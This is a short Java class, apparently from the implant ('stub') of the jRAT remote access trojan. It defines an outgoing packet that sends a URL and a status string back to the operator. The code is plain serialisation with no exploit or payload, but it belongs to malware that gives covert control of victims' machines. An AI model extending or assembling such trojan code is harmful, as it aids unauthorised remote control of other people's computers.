package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;

public class Packet27URLStatus extends AbstractOutgoingPacket {

	private String url;
	private String status;

	public Packet27URLStatus(String url, String status) {
		this.url = url;
		this.status = status;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(url);
		sw.writeLine(status);
	}

	@Override
	public byte getPacketId() {
		return 27;
	}

}
